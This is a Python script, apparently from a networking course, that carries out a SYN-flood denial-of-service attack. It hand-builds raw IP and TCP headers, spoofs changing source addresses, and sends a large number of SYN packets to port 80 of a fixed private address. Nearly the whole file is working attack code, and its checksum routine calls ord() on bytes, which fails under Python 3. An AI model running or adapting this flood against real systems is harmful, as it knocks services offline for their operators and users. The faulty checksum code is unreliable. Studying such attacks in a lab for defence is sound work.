#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/25 14:49 
# @Author   : ordar
# @File     : dos_syn_attack.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
import socket
from struct import *


# 1. 声明TCP校验和计算函数：TCP校验和用于保证传送数据的完整性，
# 该函数用于计算TCP校验和。计算TCP校验和时，先将头与数据以16位为单位进行分割，
# 再求校验位和，然后按位取反得到校验和。
def makeChecksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
        s = s + w
    s = (s>>16) + (s & 0xffff)
    s = ~s & 0xffff
    return s


# 2. 声明创建IP头函数：如前所述，该函数用于创建IP头。
def makeIPHeader(sourceIP, destIP):
    version = 4
    ihl = 5
    typeOfService = 0
    totalLength = 20 + 20
    id = 999
    flagsOffSet = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    headerChecksum = 0
    sourceAddress = socket.inet_aton(sourceIP)
    destinationAddress = socket.inet_aton(destIP)
    ihlVersion = (version << 4) + ihl
    # 3. 创建IP头结构体：使用pack()函数转换为C语言中使用的结构体形式。
    return pack('!BBHHHBBH4s4s', ihlVersion, typeOfService, totalLength, id, flagsOffSet, ttl, protocol,
                headerChecksum, sourceAddress, destinationAddress)


# 4. 声明TCP 头创建函数：如前所述，该函数用于创建TCP头。
def makeTCPHeader(port, icheckSum='none'):
    sourcePort = port
    # 目标端口填80，攻击web服务
    destinationAddressPort = 80
    SeqNumber = 0
    AckNumber = 0
    dataOffset = 5
    flagFin = 0
    flagSyn = 1
    flagRst = 0
    flagPsh = 0
    flagAck = 0
    flagUrg = 0

    window = socket.htons(5840)

    if icheckSum == 'none':
        checksum = 0
    else:
        checksum = icheckSum

    urgentPointer = 0
    dataOffsetTesv = (dataOffset << 4) + 0
    flags = (flagUrg << 5) + (flagAck << 4) + (flagPsh << 3) + (flagRst << 2) + (flagSyn << 1) + flagFin
    # 5. 创建TCP 头结构体：使用pack（）函数转换为C语言中使用的结构体形式。
    return pack("!HHLLBBHHH", sourcePort, destinationAddressPort, SeqNumber, AckNumber, dataOffsetTesv, flags, window,
                checksum, urgentPointer)


# 6. 创建原始套接字：创建原始套接字对象，使用它可以任意创建IP头与TCP头。使用原始套接字需要拥有管理员权限。
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
# 7. 设置套接字选项：设置套接字选项，以便开发人员创建IP头。
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# 8. 循环语句：使用该循环语句发送大量SYN包。
for j in range(1, 20):
    for k in range(1, 255):
        for l in range(1, 255):
            # 9. 设置IP：设置源IP与目的地IP。为了方便测试，将源IP设置为每次都变化
            sourceIP = "192.168.{}.{}".format(str(k), str(l))
            destIP = "192.168.181.137"
            # 10. 创建IP头：调用相应函数创建IP头，并转换为C语言结构体形式。
            ipHeader = makeIPHeader(sourceIP, destIP)
            # 11. 计算TCP校验和：调用相关函数，计算TCP校验和。
            tcpHeader = makeTCPHeader(10000+j+k+l)
            # 12. 转换IP结构体：使用inet_atonO函数将字符串数据转换为in_addr结构体。
            sourceAddr = socket.inet_aton(sourceIP)
            destAddr = socket.inet_aton(destIP)

            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcpLen = len(tcpHeader)
            psh = pack("!4s4sBBH", sourceAddr, destAddr, placeholder, protocol, tcpLen)
            psh = psh + tcpHeader
            # 13. 计算TCP校验和：调用相关函数，计算TCP校验和。
            tcpChecksum = makeChecksum(psh)
            # 14. 创建TCP头：设置TCP检验和，创建实际用于传送的TCP头。
            tcpHeader = makeTCPHeader(10000+j+k+l, tcpChecksum)

            packet = ipHeader + tcpHeader
            # 15. 传送包：将IP头与TCP头封装为TCPSYN包并传送。建立连接前，可以使用sendto)方法从发送方发送数据包。
            s.sendto(packet, (destIP, 0))




